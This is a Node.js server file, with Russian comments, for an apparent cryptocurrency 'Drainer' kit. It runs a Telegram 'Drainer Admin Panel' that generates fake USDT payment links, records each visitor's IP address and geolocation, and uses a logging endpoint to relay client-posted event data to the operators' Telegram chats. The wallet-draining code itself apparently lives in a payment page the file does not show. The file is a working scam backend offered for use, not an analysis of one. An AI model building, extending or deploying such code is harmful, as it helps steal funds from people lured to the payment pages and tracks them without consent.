require('dotenv').config();
const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Telegram бот (без прокси)
const bot = new TelegramBot(process.env.BOT_TOKEN, { 
    polling: true,
    request: { timeout: 30000 }
});
console.log('🤖 Telegram bot initialized');

// ============ TELEGRAM ADMIN PANEL ============

const ADMIN_IDS = ['7883109498', '8161483791'];

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = chatId.toString();
    
    if (!ADMIN_IDS.includes(userId)) {
        await bot.sendMessage(chatId, '❌ Access denied.');
        return;
    }
    
    await bot.sendMessage(chatId, `
🤖 *Drainer Admin Panel*

*Commands:*
/create 500 Test — create invoice
/stats — statistics
/help — help

*Example:*
/create 500 Test invoice
    `, { parse_mode: 'Markdown' });
});

bot.onText(/\/create (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = chatId.toString();
    
    if (!ADMIN_IDS.includes(userId)) return;
    
    const args = match[1].split(' ');
    const amount = args[0];
    const description = args.slice(1).join(' ') || 'Test';
    
    if (!amount || isNaN(amount)) {
        await bot.sendMessage(chatId, '❌ Use: /create 500 Test');
        return;
    }
    
    const invoiceId = uuidv4();
    const expiresAt = Date.now() + 30 * 60000;
    
    if (db) {
        await db.run(
            'INSERT INTO invoices (id, amount, description, created_at, expires_at, status) VALUES (?, ?, ?, ?, ?, ?)',
            [invoiceId, amount, description, Date.now(), expiresAt, 'pending']
        );
    }
    
    const paymentLink = `http://localhost:${process.env.PORT}/pay/${invoiceId}`;
    
    await bot.sendMessage(chatId, `
✅ *Invoice created!*

💰 Amount: ${amount} USDT
📝 Description: ${description}
🔗 ${paymentLink}
⏱️ Expires: 30 min
    `, { parse_mode: 'Markdown' });
    await bot.sendMessage(chatId, paymentLink);
});

bot.onText(/\/stats/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = chatId.toString();
    
    if (!ADMIN_IDS.includes(userId) || !db) return;
    
    const totalInvoices = await db.get('SELECT COUNT(*) as count FROM invoices');
    const totalVisitors = await db.get('SELECT COUNT(*) as count FROM visitors');
    
    await bot.sendMessage(chatId, `
📊 *Statistics*

📄 Invoices: ${totalInvoices?.count || 0}
👥 Visitors: ${totalVisitors?.count || 0}
    `, { parse_mode: 'Markdown' });
});

bot.onText(/\/help/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = chatId.toString();
    if (!ADMIN_IDS.includes(userId)) return;
    
    await bot.sendMessage(chatId, `
🤖 *Commands*

/start — welcome
/create 500 Test — create invoice
/stats — statistics
/help — this message
    `, { parse_mode: 'Markdown' });
});

bot.on('polling_error', (error) => {
    console.log('🔄 Polling error:', error.message);
    console.log('💡 Tip: Enable VPN if you see ECONNRESET');
});

// ============ ОТПРАВКА УВЕДОМЛЕНИЙ ============

async function sendTelegramAlert(text) {
    if (!text) return;
    
    const chatIds = process.env.CHAT_ID.split(',');
    
    for (const chatId of chatIds) {
        try {
            await bot.sendMessage(chatId.trim(), text, {
                parse_mode: 'HTML',
                disable_web_page_preview: true
            });
            console.log(`✅ Sent to ${chatId.trim()}`);
        } catch (error) {
            console.error(`❌ Failed to send to ${chatId.trim()}: ${error.message}`);
        }
    }
}

// ============ БАЗА ДАННЫХ ============

let db;
(async () => {
    try {
        db = await open({ filename: './database.sqlite', driver: sqlite3.Database });
        await db.exec(`
            CREATE TABLE IF NOT EXISTS invoices (
                id TEXT PRIMARY KEY, 
                amount DECIMAL, 
                description TEXT, 
                created_at INTEGER, 
                expires_at INTEGER, 
                status TEXT
            );
            CREATE TABLE IF NOT EXISTS visitors (
                id TEXT PRIMARY KEY, 
                invoice_id TEXT, 
                ip TEXT, 
                country TEXT, 
                city TEXT, 
                device TEXT, 
                first_seen INTEGER
            );
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                event_type TEXT,
                event_data TEXT,
                ip TEXT,
                timestamp INTEGER
            );
        `);
        console.log('✅ Database connected');
    } catch (error) {
        console.error('❌ DB error:', error);
    }
})();

// ============ API ============

app.post('/api/create-invoice', async (req, res) => {
    const { amount, description, expiryMinutes = 30 } = req.body;
    const invoiceId = uuidv4();
    const expiresAt = Date.now() + expiryMinutes * 60000;
    if (db) {
        await db.run(
            'INSERT INTO invoices (id, amount, description, created_at, expires_at, status) VALUES (?, ?, ?, ?, ?, ?)',
            [invoiceId, amount, description, Date.now(), expiresAt, 'pending']
        );
    }
    res.json({ invoiceId, paymentLink: `http://localhost:${process.env.PORT}/pay/${invoiceId}` });
});

app.get('/api/invoice/:id', async (req, res) => {
    if (!db) return res.json({ error: 'DB not ready' });
    const invoice = await db.get('SELECT * FROM invoices WHERE id = ?', req.params.id);
    res.json(invoice || { error: 'Not found' });
});

app.post('/api/log', async (req, res) => {
    const data = req.body;
    console.log('📥 Log:', data.type);
    
    if (db) {
        await db.run(
            'INSERT INTO logs (event_type, event_data, ip, timestamp) VALUES (?, ?, ?, ?)',
            [data.type, JSON.stringify(data), req.ip, Date.now()]
        );
    }
    
    if (data.telegram) {
        await sendTelegramAlert(data.telegram);
    }
    
    res.json({ success: true });
});

app.get('/api/geo/:ip', async (req, res) => {
    try {
        const r = await axios.get(`http://ip-api.com/json/${req.params.ip}`);
        res.json({ country: r.data.country, city: r.data.city });
    } catch {
        res.json({ country: 'Unknown', city: 'Unknown' });
    }
});

app.get('/admin', (req, res) => {
    res.sendFile(__dirname + '/public/admin.html');
});

app.get('/pay/:invoiceId', (req, res) => {
    res.sendFile(__dirname + '/public/pay.html');
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log(`🚀 Server: http://localhost:${PORT}`);
    console.log(`📊 Admin: http://localhost:${PORT}/admin`);
    console.log(`👥 Recipients: ${process.env.CHAT_ID}`);
});